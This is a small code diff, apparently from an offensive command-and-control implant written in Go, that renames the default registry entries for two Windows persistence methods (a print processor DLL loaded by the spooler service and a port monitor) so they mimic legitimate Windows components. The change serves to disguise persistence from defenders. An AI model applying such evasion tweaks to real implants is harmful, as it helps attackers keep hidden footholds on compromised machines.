@@ -170,7 +170,7 @@ const printProcessorDir = `C:\Windows\System32\spool\prtprocs\x64`
 // Registers a DLL as a print processor, loaded by spoolsv.exe at service start.
 func persistPrintProcessor(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		args.Name = "FawkesProc"
+		args.Name = "PrintFilterSvc"
 	}
 
 	regPath := printProcessorRegBase + `\` + args.Name
@@ -263,7 +263,7 @@ const portMonitorRegBase = `SYSTEM\CurrentControlSet\Control\Print\Monitors`
 // goes into System32 directly.
 func persistPortMonitor(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		args.Name = "FawkesMon"
+		args.Name = "WinPortMon"
 	}
 
 	regPath := portMonitorRegBase + `\` + args.Name
